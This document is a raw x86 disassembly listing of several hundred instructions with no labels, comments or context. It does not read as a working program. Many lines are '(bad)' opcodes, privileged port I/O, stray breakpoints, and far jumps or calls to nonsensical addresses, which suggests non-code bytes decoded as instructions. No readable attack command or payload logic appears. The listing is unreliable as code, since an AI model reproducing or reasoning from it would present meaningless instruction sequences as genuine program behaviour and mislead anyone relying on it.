  41c212:	xor    ecx,DWORD PTR [ebp-0x36]
  41c215:	imul   edi,DWORD PTR [ebp-0x1],0xffffffbf
  41c219:	jnp    0x41c289
  41c21b:	fnstsw WORD PTR [ebx+esi*4+0xbe46533]
  41c222:	sub    eax,DWORD PTR [edx+0x6f70dd7f]
  41c228:	pop    edi
  41c229:	icebp  
  41c22a:	sub    ch,BYTE PTR [edx+0x6c]
  41c22d:	jbe    0x41c27b
  41c22f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c230:	cmp    ebp,eax
  41c232:	fisub  DWORD PTR [ebp-0x227c2b2b]
  41c238:	call   0x1cd67d1d
  41c23d:	inc    edx
  41c23e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c23f:	sub    DWORD PTR [ebx],ebx
  41c241:	int    0xd1
  41c243:	in     eax,dx
  41c244:	or     eax,0x2cd85dbd
  41c24a:	sub    al,0x2
  41c24c:	bound  ecx,QWORD PTR [esi+eiz*2-0x259f5e13]
  41c253:	call   0x52f2ceaf
  41c258:	test   eax,0x12170812
  41c25d:	xchg   ecx,eax
  41c25e:	fwait
  41c25f:	shl    cl,0x6a
  41c262:	sahf   
  41c263:	adc    eax,ecx
  41c265:	lock mov ch,0x74
  41c268:	dec    esi
  41c269:	mov    dh,0xd0
  41c26b:	jecxz  0x41c281
  41c26d:	cmp    eax,0xd6623bc2
  41c272:	bound  ebp,QWORD PTR [edi-0x399eda59]
  41c278:	pop    ds
  41c279:	xlat   BYTE PTR ds:[ebx]
  41c27a:	inc    edx
  41c27b:	popf   
  41c27c:	dec    ebp
  41c27d:	icebp  
  41c27e:	adc    cl,bl
  41c280:	adc    ah,cl
  41c282:	int3   
  41c283:	mov    ebx,0x576aa047
  41c288:	xor    DWORD PTR [edi-0x555cb758],ecx
  41c28e:	aad    0x8f
  41c290:	and    BYTE PTR [esi+0x7a],0x4a
  41c294:	jl     0x41c30d
  41c296:	fdivr  DWORD PTR [ecx-0x4f]
  41c299:	xor    ecx,DWORD PTR [esi+0x7a0ff8f1]
  41c29f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c2a0:	xor    eax,0x6e715da3
  41c2a5:	pop    DWORD PTR [edi+0x4b3e3509]
  41c2ab:	and    eax,0xa755e19f
  41c2b0:	xor    dh,bh
  41c2b2:	int    0x7e
  41c2b4:	inc    edx
  41c2b5:	jmp    0x41c2a8
  41c2b7:	cmp    cl,dl
  41c2b9:	xchg   ecx,eax
  41c2ba:	sub    DWORD PTR [ebp*2-0x7cb0bc42],0x52553492
  41c2c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c2c6:	fwait
  41c2c7:	lds    edi,FWORD PTR [edx-0x48]
  41c2ca:	sbb    eax,0x2ae67831
  41c2cf:	out    0x8f,al
  41c2d1:	ja     0x41c30a
  41c2d3:	cld    
  41c2d4:	mov    bh,0x0
  41c2d6:	repnz bound eax,QWORD PTR [edi]
  41c2d9:	daa    
  41c2da:	jo     0x41c26b
  41c2dc:	shl    DWORD PTR [ecx-0x74],1
  41c2df:	call   DWORD PTR [ebp+ebx*8-0x38]
  41c2e3:	sub    BYTE PTR [eax+0x15],al
  41c2e6:	dec    ebp
  41c2e7:	cdq    
  41c2e8:	push   esp
  41c2e9:	cld    
  41c2ea:	or     eax,0x61dccdfb
  41c2ef:	in     eax,0x47
  41c2f1:	push   ebx
  41c2f2:	popf   
  41c2f3:	mov    ah,0x8e
  41c2f5:	ficomp DWORD PTR [edi+0x42]
  41c2f8:	dec    ecx
  41c2f9:	test   DWORD PTR [ebp+0x2f935ff1],ecx
  41c2ff:	bound  edi,QWORD PTR [ecx]
  41c301:	cdq    
  41c302:	mov    ch,0xf5
  41c304:	push   ecx
  41c305:	adc    dh,cl
  41c307:	fstp   DWORD PTR [eax-0x2e]
  41c30a:	pop    ebx
  41c30b:	or     eax,0x42369ade
  41c310:	inc    edi
  41c311:	push   ebp
  41c312:	(bad)  
  41c313:	sub    ch,al
  41c315:	adc    ah,BYTE PTR [eax+0x19]
  41c318:	lods   eax,DWORD PTR ds:[esi]
  41c319:	cmp    ah,0x92
  41c31c:	leave  
  41c31d:	inc    ebp
  41c31e:	popf   
  41c31f:	aaa    
  41c320:	xchg   cl,dh
  41c322:	rcr    DWORD PTR [edx-0x64552659],cl
  41c328:	aas    
  41c329:	cmp    ecx,DWORD PTR [edx]
  41c32b:	mov    WORD PTR [ecx+0x7a],?
  41c32e:	(bad)  
  41c32f:	jns    0x41c31e
  41c331:	inc    esp
  41c332:	fsub   QWORD PTR [ecx+0x5f]
  41c335:	and    bh,BYTE PTR [ebx]
  41c337:	mov    eax,ds:0xc19a1b22
  41c33c:	aam    0xd0
  41c33e:	imul   edx,DWORD PTR [eax+0x13],0x9
  41c342:	push   0xd52ff66f
  41c347:	stos   DWORD PTR es:[edi],eax
  41c348:	enter  0xef58,0x90
  41c34c:	xor    edx,edx
  41c34e:	je     0x41c3b7
  41c350:	mov    edi,0xf4397214
  41c355:	inc    esi
  41c356:	(bad)  
  41c357:	add    bh,ah
  41c359:	jo     0x41c2db
  41c35b:	adc    al,0x23
  41c35d:	mov    eax,ds:0x6384cfa8
  41c362:	push   ebp
  41c363:	sti    
  41c364:	or     DWORD PTR [ebx+esi*1+0x22dd6166],eax
  41c36b:	arpl   si,bp
  41c36d:	push   0x989ef745
  41c372:	xor    al,0xe0
  41c374:	xchg   edi,eax
  41c375:	(bad)  
  41c376:	imul   edx,esi,0xf9a4e8ea
  41c37c:	int3   
  41c37d:	stos   DWORD PTR es:[edi],eax
  41c37e:	pushf  
  41c37f:	clc    
  41c380:	inc    ebx
  41c381:	mov    esp,0x22a977b9
  41c386:	jp     0x41c312
  41c388:	add    DWORD PTR [esi],edi
  41c38a:	pop    ebx
  41c38b:	cmp    DWORD PTR [ecx],ebx
  41c38d:	imul   esi,DWORD PTR [ecx+0x14],0xe3a8b2b9
  41c394:	mov    esp,gs
  41c396:	fwait
  41c397:	retf   
  41c398:	mov    DWORD PTR [ebp+0x7949e42b],0x8e348da5
  41c3a2:	stos   BYTE PTR es:[edi],al
  41c3a3:	das    
  41c3a4:	dec    eax
  41c3a5:	sbb    DWORD PTR [eax],0xffffff92
  41c3a8:	sbb    bh,dh
  41c3aa:	dec    ecx
  41c3ab:	or     DWORD PTR [ecx+0x2c],eax
  41c3ae:	adc    BYTE PTR [edx-0x5d7d41a1],0xdd
  41c3b5:	xrelease mov BYTE PTR [eax-0x55903bea],dh
  41c3bc:	fcom   QWORD PTR [ecx+ebx*8+0x1e]
  41c3c0:	fstp   DWORD PTR [eax]
  41c3c2:	inc    ecx
  41c3c3:	push   ecx
  41c3c4:	std    
  41c3c5:	int3   
  41c3c6:	scas   al,BYTE PTR es:[edi]
  41c3c7:	xor    dl,BYTE PTR [eax]
  41c3c9:	ja     0x41c407
  41c3cb:	fcomp  DWORD PTR [ebx+edx*4+0x2e]
  41c3cf:	adc    eax,0x83ba61f4
  41c3d4:	jbe    0x41c450
  41c3d6:	enter  0xc9df,0x5c
  41c3da:	xor    eax,0x156f4a6
  41c3df:	sbb    al,0xcc
  41c3e1:	inc    ecx
  41c3e2:	inc    esp
  41c3e3:	(bad)  
  41c3e4:	mov    edx,0x8c5c5eff
  41c3e9:	ins    DWORD PTR es:[edi],dx
  41c3ea:	scas   al,BYTE PTR es:[edi]
  41c3eb:	xchg   cl,ch
  41c3ed:	sub    DWORD PTR [esp+ecx*4+0x5],ebp
  41c3f1:	aas    
  41c3f2:	lods   eax,DWORD PTR ds:[esi]
  41c3f3:	imul   ecx,ebx,0xd06de4a7
  41c3f9:	leave  
  41c3fa:	scas   al,BYTE PTR es:[edi]
  41c3fb:	call   0xcb380630
  41c400:	mov    eax,cs
  41c402:	mov    edi,0x656bd7b9
  41c407:	mov    ah,0x21
  41c409:	jne    0x41c40f
  41c40b:	sar    BYTE PTR [edi],1
  41c40d:	ret    0x7786
  41c410:	xor    eax,DWORD PTR [edi]
  41c412:	fwait
  41c413:	mov    esi,0xb2453229
  41c418:	xchg   esp,eax
  41c419:	push   0xffffffaa
  41c41b:	fistp  QWORD PTR [edi-0x321602ef]
  41c421:	cdq    
  41c422:	push   esp
  41c423:	in     al,dx
  41c424:	pop    esi
  41c425:	pop    esp
  41c426:	std    
  41c427:	ins    BYTE PTR es:[edi],dx
  41c428:	fstp   DWORD PTR [ecx-0x60fd7238]
  41c42e:	mov    ecx,0x33608ebe
  41c433:	cmp    al,BYTE PTR [ecx]
  41c435:	inc    ecx
  41c436:	ror    esi,cl
  41c438:	je     0x41c402
  41c43a:	jmp    0x2795:0x4db36d6f
  41c441:	mov    ds:0xccf54418,al
  41c446:	(bad)  
  41c447:	mov    edi,0x47867456
  41c44c:	pop    ebp
  41c44d:	fs mov bl,0x2e
  41c450:	or     al,0x45
  41c452:	mov    ebx,0xfd45b593
  41c457:	add    DWORD PTR [ecx],edi
  41c459:	mov    ds:0xdc65983c,eax
  41c45e:	sub    al,0xd6
  41c460:	and    ebp,DWORD PTR [edi-0x1a]
  41c463:	int    0x70
  41c465:	retf   
  41c466:	jmp    0xd334:0x445f7ae2
  41c46d:	clc    
  41c46e:	sub    eax,0x2bf1817
  41c473:	dec    eax
  41c474:	out    0xae,al
  41c476:	inc    esi
  41c477:	into   
  41c478:	dec    esp
  41c479:	mov    ah,0x6
  41c47b:	adc    DWORD PTR [ebp-0x178060d5],ebx
  41c481:	cli    
  41c482:	(bad)  
  41c483:	repnz sub BYTE PTR [eax+esi*1-0x56],dh
  41c488:	add    BYTE PTR [edx-0x5d],bl
  41c48b:	fisub  DWORD PTR [esi]
  41c48d:	popa   
  41c48e:	dec    eax
  41c48f:	aas    
  41c490:	pop    edx
  41c491:	inc    ebx
  41c492:	out    0x99,al
  41c494:	xlat   BYTE PTR ds:[ebx]
  41c495:	mov    cl,0x48
  41c497:	pop    esp
  41c498:	add    al,0xbf
  41c49a:	or     ch,BYTE PTR [edx-0x6f]
  41c49d:	outs   dx,BYTE PTR ds:[esi]
  41c49e:	pushf  
  41c49f:	fwait
  41c4a0:	clc    
  41c4a1:	inc    esp
  41c4a2:	or     al,0xee
  41c4a4:	addr16 and eax,0x372f78ff
  41c4aa:	in     eax,0x29
  41c4ac:	shl    ah,cl
  41c4ae:	mov    WORD PTR [ebp+0x19fe08b6],ss
  41c4b4:	mov    edx,0x184a2726
  41c4b9:	mov    ebx,0xe17e4398
  41c4be:	ret    
  41c4bf:	shr    DWORD PTR [ebp-0x2],0xbb
  41c4c3:	mov    esi,0x6bd61920
  41c4c8:	(bad)  
  41c4c9:	or     eax,0xc87d87b5
  41c4ce:	or     cl,ah
  41c4d0:	pushf  
  41c4d1:	fistp  QWORD PTR [ebp+0x3a877142]
  41c4d7:	addr16 xchg edx,eax
  41c4d9:	inc    eax
  41c4da:	data16 out 0x31,al
  41c4dd:	das    
  41c4de:	cdq    
  41c4df:	rcr    ah,0x3a
  41c4e2:	test   eax,0x7b0e88d1
  41c4e7:	adc    eax,0x1a51a801
  41c4ec:	jle    0x41c50f
  41c4ee:	mov    DWORD PTR [ecx-0x62a9a0c5],esi
  41c4f4:	xchg   edx,eax
  41c4f5:	push   0x24
  41c4f7:	pop    es
  41c4f8:	mov    al,0xb6
  41c4fa:	and    BYTE PTR [eax-0x59],ch
  41c4fd:	cmp    BYTE PTR [edx-0x41e7e40c],dl
  41c503:	aam    0xe0
  41c505:	add    DWORD PTR [edx-0x2d],ebx
  41c508:	and    eax,0xa751251b
  41c50d:	fcmove st,st(2)
  41c50f:	lods   al,BYTE PTR ds:[esi]
  41c510:	push   ebp
  41c511:	cs hlt 
  41c513:	sub    DWORD PTR [ebx-0x32a7076f],0x29
  41c51a:	add    DWORD PTR [esi],edi
  41c51c:	imul   esp,edx,0x7b
  41c51f:	jmp    0x41c524
  41c521:	adc    esp,ecx
  41c523:	arpl   WORD PTR [edi+0x64],ax
  41c526:	jmp    0x41c4d4
  41c528:	mov    cl,0x5c
  41c52a:	scas   al,BYTE PTR es:[edi]
  41c52b:	mov    edx,0xa9ad1151
  41c530:	jo     0x41c4c4
  41c532:	sbb    al,BYTE PTR [esi+0x29c7b43]
  41c538:	mov    ah,0xb7
  41c53a:	or     ecx,DWORD PTR [ebp+0x49334228]
  41c540:	adc    ah,BYTE PTR [esi]
  41c542:	scas   al,BYTE PTR es:[edi]
  41c543:	loope  0x41c4e7
  41c545:	xor    bl,BYTE PTR [edx]
  41c547:	outs   dx,DWORD PTR ds:[esi]
  41c548:	jecxz  0x41c528
  41c54a:	pop    edx
  41c54b:	loope  0x41c4d7
  41c54d:	or     al,0xe3
  41c54f:	pop    ds
  41c550:	adc    DWORD PTR [edx-0x7eaed8a0],0xddd6d8ec
  41c55a:	aaa    
  41c55b:	mov    esi,0xa92a8e6a
  41c560:	push   ecx
  41c561:	jno    0x41c577
  41c563:	push   ebp
  41c564:	add    DWORD PTR [eax],ecx
  41c566:	sti    
  41c567:	lahf   
  41c568:	int    0x4a
  41c56a:	jecxz  0x41c52f
  41c56c:	push   eax
  41c56d:	jne    0x41c540
  41c56f:	mov    ch,0xad
  41c571:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c572:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c573:	cdq    
  41c574:	pop    ebx
  41c575:	mov    ecx,eax
  41c577:	(bad)  
  41c578:	arpl   WORD PTR [ebx+0x24],bx
  41c57b:	into   
  41c57c:	jmp    0xfc:0xd0979951
  41c583:	mov    dl,0x4e
  41c585:	cmp    al,0x4d
  41c587:	loop   0x41c5f4
  41c589:	xchg   ebp,eax
  41c58a:	jae    0x41c53c
  41c58c:	jae    0x41c5bd
  41c58e:	lock repnz cmp al,0xe2
  41c592:	add    DWORD PTR [esi],edx
  41c594:	cmp    eax,0x4b864280
  41c599:	call   0xd923f8eb
  41c59e:	data16 mov dh,0x68
  41c5a1:	xchg   ecx,eax
  41c5a2:	sbb    eax,0x42411ea3
  41c5a7:	add    edx,DWORD PTR [edx+0x298fce94]
  41c5ad:	adc    eax,0x8ecb9dba
  41c5b2:	mov    BYTE PTR [ecx],ch
  41c5b4:	mov    edx,0xca8a6939
  41c5b9:	mov    dl,0x12
  41c5bb:	(bad)  
  41c5bc:	jge    0x41c5b4
  41c5be:	xchg   edx,eax
  41c5bf:	mov    dh,dh
  41c5c1:	mov    ecx,0x4b505d62
  41c5c6:	pop    ds
  41c5c7:	mov    cs,ecx
  41c5c9:	jnp    0x41c578
  41c5cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c5cc:	dec    eax
  41c5cd:	faddp  st(2),st
  41c5cf:	pop    esp
  41c5d0:	loope  0x41c5bc
  41c5d2:	inc    esi
  41c5d3:	jp     0x41c561
  41c5d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c5d6:	shl    DWORD PTR [eax+0x9f98997],1
  41c5dc:	jns    0x41c5a5
  41c5de:	cmp    dh,BYTE PTR [ecx+0x424b3623]
  41c5e4:	push   edx
  41c5e5:	inc    edi
  41c5e6:	aad    0xe
  41c5e8:	add    ecx,DWORD PTR [ebx+0xf]
  41c5eb:	std    
  41c5ec:	jmp    0x41c584
  41c5ee:	imul   edx,DWORD PTR [ecx],0x26
  41c5f1:	dec    ecx
  41c5f2:	jmp    0x41c5e4
  41c5f4:	add    edi,ebx
  41c5f6:	cdq    
  41c5f7:	aaa    
  41c5f8:	and    BYTE PTR [eax],ch
  41c5fa:	inc    ebx
  41c5fb:	jg     0x41c61c
  41c5fd:	jle    0x41c5fd
  41c5ff:	int    0xa9
  41c601:	stc    
  41c602:	mov    cl,0xf
  41c604:	jmp    0xc269ca2c
  41c609:	sub    DWORD PTR [eax],eax
  41c60b:	jbe    0x41c657
  41c60d:	jmp    0xf79556cf
  41c612:	pop    ecx
  41c613:	pushf  
  41c614:	jge    0x41c656
  41c616:	pop    ss
  41c617:	or     BYTE PTR ds:0xf49cc0d4,cl
  41c61d:	sub    al,0xc9
  41c61f:	(bad)  
  41c620:	cmp    ebx,DWORD PTR [ebx+0x2]
  41c623:	popa   
  41c624:	xchg   dx,ax
  41c626:	sub    eax,esp
  41c628:	loope  0x41c6a1
  41c62a:	push   ebp
  41c62b:	dec    eax
  41c62c:	ins    BYTE PTR es:[edi],dx
  41c62d:	pusha  
  41c62e:	pop    ss
  41c62f:	dec    eax
  41c630:	not    BYTE PTR [ecx-0x2eab8592]
  41c636:	pop    es
  41c637:	xchg   ebp,eax
  41c638:	sbb    ebx,DWORD PTR [edi]
  41c63a:	in     al,dx
  41c63b:	xchg   esi,eax
  41c63c:	adc    DWORD PTR [esi-0x80],ecx
  41c63f:	adc    BYTE PTR [ebx],bh
  41c641:	clc    
  41c642:	fldcw  WORD PTR [edx]
  41c644:	test   DWORD PTR [edx-0x37],ebp
  41c647:	mov    edx,0x429b1b58
  41c64c:	push   edi
  41c64d:	jb     0x41c5e4
  41c64f:	test   eax,0x616309ee
  41c654:	(bad)  
  41c655:	fsub   QWORD PTR [eax+0x6d]
  41c658:	add    edi,edx
  41c65a:	jp     0x41c68c
  41c65c:	cmp    BYTE PTR [edi],bh
  41c65e:	call   0x2fb2:0x51fdc7e1
  41c665:	pushf  
  41c666:	loopne 0x41c680
  41c668:	xchg   edi,eax
  41c669:	adc    eax,0x3178801
  41c66e:	xor    DWORD PTR [ecx+0x1ea541c0],edx
  41c674:	jns    0x41c67d
  41c676:	scas   eax,DWORD PTR es:[edi]
  41c677:	dec    edx
  41c678:	ror    DWORD PTR [ecx-0x4c],1
  41c67b:	sbb    ch,BYTE PTR [esi-0x427e68f9]
  41c681:	dec    ecx
  41c682:	clc    
  41c683:	sub    dl,BYTE PTR [edx-0x69]
  41c686:	sbb    bh,BYTE PTR [ebp+0x56]
  41c689:	outs   dx,DWORD PTR ds:[esi]
  41c68a:	mov    eax,DWORD PTR [ebx]
  41c68c:	pop    ss
  41c68d:	shr    WORD PTR [esi-0x4d33131],cl
  41c694:	xor    BYTE PTR [edi+0x56],al
  41c697:	ds mov edi,0x5b9c4ff7
  41c69d:	jmp    0xc383933e
  41c6a2:	dec    edi
  41c6a3:	jnp    0x41c6be
  41c6a5:	shr    dh,0xea
  41c6a8:	into   
  41c6a9:	jecxz  0x41c663
  41c6ab:	bound  ecx,QWORD PTR [esi-0x1f]
  41c6ae:	das    
  41c6af:	mov    ds:0x9a639796,al
  41c6b4:	mov    bh,0x56
  41c6b6:	sbb    BYTE PTR [ebx],0x92
  41c6b9:	and    DWORD PTR [esi],0x5
  41c6bc:	mov    ds:0x63b12aa2,al
  41c6c1:	pop    es
  41c6c2:	xchg   esp,eax
  41c6c3:	sbb    edi,0xca88ff40
  41c6c9:	push   0x15a794dd
  41c6ce:	dec    eax
  41c6cf:	xor    BYTE PTR [ebx],cl
  41c6d1:	stos   DWORD PTR es:[edi],eax
  41c6d2:	or     bh,BYTE PTR [edx+0x2cc73949]
  41c6d8:	popf   
  41c6d9:	fcomp  QWORD PTR ds:0x843a701b
  41c6df:	sahf   
  41c6e0:	test   bh,dh
  41c6e2:	mov    bh,0xd1
  41c6e4:	sbb    esi,DWORD PTR ds:0x5e015c9a
  41c6ea:	sbb    eax,0xc37834f5
  41c6ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c6f0:	test   al,0xbe
  41c6f2:	pop    esp
  41c6f3:	(bad)  [edi+ebx*1]
  41c6f6:	jns    0x41c680
  41c6f8:	jge    0x41c71f
  41c6fa:	(bad)  
  41c6fb:	aad    0x55
  41c6fd:	mov    bh,0x7d
  41c6ff:	ret    
  41c700:	mov    bh,0xe
  41c702:	add    al,BYTE PTR [edi]
  41c704:	jnp    0x41c6ac
  41c706:	and    eax,0xa4fe8f03
  41c70b:	push   0xffffffb4
  41c70d:	jnp    0x41c78e
  41c70f:	gs (bad) 
  41c711:	mov    DWORD PTR ds:0x2f6abb1e,esi
  41c717:	dec    ecx
  41c718:	(bad)  
  41c719:	gs mul ah
  41c71c:	or     eax,0x51546619
  41c721:	cwde   
  41c722:	lds    esi,FWORD PTR [ebx]
  41c724:	clc    
  41c725:	and    DWORD PTR [edx-0x2b],esi
  41c728:	push   esp
  41c72a:	sbb    DWORD PTR [edx-0x51],0x523c71ba
  41c731:	mov    ds:0xbd0ea9b7,al
  41c736:	pop    esi
  41c737:	mov    ebp,0xbc6cc7ae
  41c73c:	inc    edi
  41c73d:	add    edx,DWORD PTR [edx+0x75495701]
  41c743:	loopne 0x41c6cc
  41c745:	stc    
  41c746:	dec    esp
  41c747:	push   0x9b561aa8
  41c74c:	adc    al,0x60
  41c74e:	or     esi,DWORD PTR [ebx-0x6c]
  41c751:	mov    BYTE PTR [ebp+0x6a17ac79],bh
  41c757:	sbb    DWORD PTR [ebp-0x56],esi
  41c75a:	bound  ecx,QWORD PTR [ebp+0x47606c5d]
  41c760:	daa    
  41c761:	inc    ecx
  41c762:	inc    esp
  41c763:	pop    ds
  41c764:	in     al,dx
  41c765:	push   edi
  41c766:	das    
  41c767:	or     ah,dl
  41c769:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c76a:	loopne 0x41c7b4
  41c76c:	adc    ebx,DWORD PTR [edx-0x40]
  41c76f:	mov    eax,ds:0xe4e727d1
  41c774:	push   es
  41c775:	jl     0x41c7f1
  41c777:	shl    DWORD PTR [edi+0x587f256d],1
  41c77d:	fsubr  QWORD PTR [ecx+ebx*1-0x55]
  41c781:	xchg   edx,eax
  41c782:	pop    ss
  41c783:	cli    
  41c784:	and    eax,0x87d48d89
  41c789:	sub    al,0x6b
  41c78b:	aad    0x2d
  41c78d:	scas   eax,DWORD PTR es:[edi]
  41c78e:	pop    ecx
  41c78f:	or     al,0xf0
  41c791:	in     al,dx
  41c792:	sbb    dh,BYTE PTR [edx+0x8]
  41c795:	std    
  41c796:	and    eax,0xd5716cac
  41c79b:	jg     0x41c720
  41c79d:	iret   
  41c79e:	out    0xbf,eax
  41c7a0:	cmp    ah,BYTE PTR [edx]
  41c7a2:	pop    ebx
  41c7a3:	fidiv  WORD PTR [esi-0x7a]
  41c7a6:	xor    eax,eax
  41c7a8:	or     al,0x41
  41c7aa:	fist   WORD PTR [ecx+0xc]
  41c7ad:	outs   dx,BYTE PTR ds:[esi]
  41c7ae:	jmp    0xf1714930
  41c7b3:	iret   
  41c7b4:	in     eax,dx
  41c7b5:	push   ebp
  41c7b6:	std    
  41c7b7:	ins    BYTE PTR es:[edi],dx
  41c7b8:	adc    al,0x11
  41c7ba:	inc    edi
  41c7bb:	icebp  
  41c7bc:	pop    esp
  41c7bd:	ins    DWORD PTR es:[edi],dx
  41c7be:	pop    esi
  41c7bf:	aad    0xf6
  41c7c1:	mov    edi,0x5fb21ffa
  41c7c6:	jmp    0xa931824d
  41c7cb:	mov    esp,0x6df9f3fe
  41c7d0:	cmp    cl,BYTE PTR [edi-0x3379cad6]
  41c7d6:	pop    ecx
  41c7d7:	sub    DWORD PTR [eax-0x28],esp
  41c7da:	add    eax,0xd51ae03e
  41c7df:	ret    0x4971
  41c7e2:	mov    al,0xdc
  41c7e4:	cmp    dh,BYTE PTR [edi+0x5]
  41c7e7:	loop   0x41c7e2
  41c7e9:	adc    al,0x1a
  41c7eb:	mov    BYTE PTR [ebx+0x3c44b976],al
  41c7f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c7f2:	stos   BYTE PTR es:[edi],al
  41c7f3:	or     DWORD PTR [edi],ebx
  41c7f5:	ins    BYTE PTR es:[edi],dx
  41c7f6:	push   ecx
  41c7f7:	lock shl al,cl
  41c7fa:	push   eax
  41c7fb:	dec    ebp
  41c7fc:	jg     0x41c867
  41c7fe:	mov    ebp,0xec36fbec
  41c803:	sar    BYTE PTR [edi-0x6],1
  41c806:	or     ch,BYTE PTR [ebp+0x54]
  41c809:	(bad)  
  41c80a:	enter  0xaf52,0x3d
  41c80e:	jp     0x41c811
  41c810:	pop    edi
  41c811:	jmp    0x41c890
  41c813:	adc    eax,0xc6e6f65f
  41c818:	adc    eax,0xc13e84c4
  41c81d:	and    eax,0xa5b10bf
  41c822:	pop    esp
  41c823:	test   al,0x12
  41c825:	inc    esi
  41c826:	pop    eax
  41c827:	fisttp QWORD PTR [ebx-0x74]
  41c82a:	arpl   WORD PTR [edx],ax
  41c82c:	add    ebp,edi
  41c82e:	mov    ecx,0x7effba22
  41c833:	or     DWORD PTR [eax*8-0x6a26f761],eax
  41c83a:	jb     0x41c80c
  41c83c:	cmp    BYTE PTR [edx+0x2b],ah
  41c83f:	cmp    eax,edi
  41c841:	push   eax
  41c842:	push   esp
  41c843:	xlat   BYTE PTR ds:[ebx]
  41c844:	aaa    
  41c845:	mov    bh,al
  41c847:	push   esp
  41c848:	pop    ebx
  41c849:	or     al,0x19
  41c84c:	shl    BYTE PTR [ebx],cl
  41c84e:	inc    esi
  41c84f:	(bad)  
  41c850:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c851:	or     bh,al
  41c853:	fidiv  DWORD PTR [edi-0x3c]
  41c856:	data16 add bl,al
  41c859:	push   ecx
  41c85a:	in     eax,0xeb
  41c85c:	pop    esp
  41c85d:	mov    ds:0x6ad2d294,eax
  41c862:	add    BYTE PTR [edi],bh
  41c864:	sub    eax,0xbcf3745c
  41c869:	sub    ah,al
  41c86b:	imul   DWORD PTR es:[esi]
  41c86e:	push   esp
  41c86f:	ret    
  41c870:	out    dx,eax
  41c871:	jle    0x41c824
  41c873:	push   0xd2335369
  41c878:	cdq    
  41c879:	mov    WORD PTR [edi+0x16],cs
  41c87c:	(bad)  
  41c87d:	retf   
  41c87e:	dec    esi
  41c87f:	sub    BYTE PTR [esi],ch
  41c881:	jmp    0xf6fb:0x13cb30c8
  41c888:	cmp    BYTE PTR [eax],dl
  41c88a:	lods   eax,DWORD PTR ds:[esi]
  41c88b:	adc    BYTE PTR [edx],bh
  41c88d:	jae    0x41c814
  41c88f:	xchg   esp,eax
  41c890:	push   ebp
  41c891:	mov    ch,0xc6
  41c893:	mov    eax,ecx
  41c895:	outs   dx,DWORD PTR ds:[esi]
  41c896:	push   ds
  41c897:	xor    ecx,esi
  41c899:	rcr    BYTE PTR [ecx],0x8f
  41c89c:	aam    0xb9
  41c89e:	pop    esp
  41c89f:	call   0x310eeedd
  41c8a4:	daa    
  41c8a5:	cmp    bh,BYTE PTR [ebp-0x12]
  41c8a8:	dec    ebp
  41c8a9:	adc    al,0xfc
  41c8ab:	xchg   DWORD PTR [ebx-0xd459887],ebp
  41c8b1:	jb     0x41c848
  41c8b3:	js     0x41c891
  41c8b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c8b6:	out    0xb9,al
  41c8b8:	xchg   BYTE PTR [edi+0x6f36ae66],al
  41c8be:	sbb    edi,0x3c
  41c8c1:	lds    edx,FWORD PTR [ecx]
  41c8c3:	ret    0xb63a
  41c8c6:	loope  0x41c8c6
  41c8c8:	pop    esp
  41c8c9:	ss xchg ebp,eax
  41c8cb:	out    0x3f,al
  41c8cd:	or     eax,0xef4b1c6d
  41c8d2:	cdq    
  41c8d3:	in     al,dx
  41c8d4:	dec    ebp
  41c8d5:	call   DWORD PTR [esp+edx*8+0x938f834]
  41c8dc:	arpl   WORD PTR [eax],si
  41c8de:	je     0x41c8ab
  41c8e0:	and    ch,BYTE PTR [eax+0x10]
  41c8e3:	xor    al,0x55
  41c8e5:	push   ebx
  41c8e6:	mov    esp,0xd15f02d3
  41c8eb:	jae    0x41c964
  41c8ed:	push   eax
  41c8ee:	les    edi,FWORD PTR [edi-0x38]
  41c8f1:	lea    edi,[eax-0x1d]
  41c8f4:	das    
  41c8f5:	xor    edi,0x35ccc794
  41c8fb:	ret    
  41c8fc:	enter  0x3e25,0x5b
  41c900:	aaa    
  41c901:	sub    BYTE PTR [ecx],bl
  41c903:	sbb    DWORD PTR [ecx-0x77f019ef],eax
  41c909:	xchg   edx,eax
  41c90a:	sub    DWORD PTR [bp+si+0x36a6],ebx
  41c90f:	mov    al,ds:0x65a86e9b
  41c914:	push   ds
  41c915:	mov    cl,0xdc
  41c917:	sub    al,0xb8
  41c919:	pop    ds
  41c91a:	pushf  
  41c91b:	sti    
  41c91c:	jge    0x41c90c
  41c91e:	ror    DWORD PTR [esi+0x2d],cl
  41c921:	push   0x9cb9240c
  41c926:	push   ss
  41c927:	sbb    edx,DWORD PTR [ebx-0x77cc9e01]
  41c92d:	in     eax,0x7f
  41c92f:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  41c931:	iret   
  41c932:	repz repz xchg esp,eax
  41c935:	fldcw  WORD PTR [eax+ecx*2+0x72]
  41c939:	sahf   
  41c93a:	pop    ebx
  41c93b:	retf   0x22a8
  41c93e:	xchg   BYTE PTR [edi-0x7ba79568],al
  41c944:	imul   esp,DWORD PTR [ebx+eax*8+0x75244683],0xffffffa5
  41c94c:	sahf   
  41c94d:	pusha  
  41c94e:	(bad)  
  41c94f:	mov    bl,0x31
  41c951:	and    al,0xfa
  41c953:	les    esi,FWORD PTR [ebx]
  41c955:	push   0xffffffa3
  41c957:	xor    eax,0xf866f386
  41c95c:	inc    ecx
  41c95d:	je     0x41c9a1
  41c95f:	mov    ds:0x37814cc2,al
  41c964:	mov    ebx,esp
  41c966:	fnstsw WORD PTR gs:[edx-0x4c4610f5]
  41c96d:	jo     0x41c960
  41c96f:	push   esi
  41c970:	dec    ebp
  41c971:	xchg   esi,eax
  41c972:	push   eax
  41c973:	test   eax,0xe4e7c73b
  41c978:	sbb    DWORD PTR [ecx-0x37],ebx
  41c97b:	mov    eax,ds:0xff9e782
  41c980:	xchg   esp,eax
  41c981:	cld    
  41c982:	lahf   
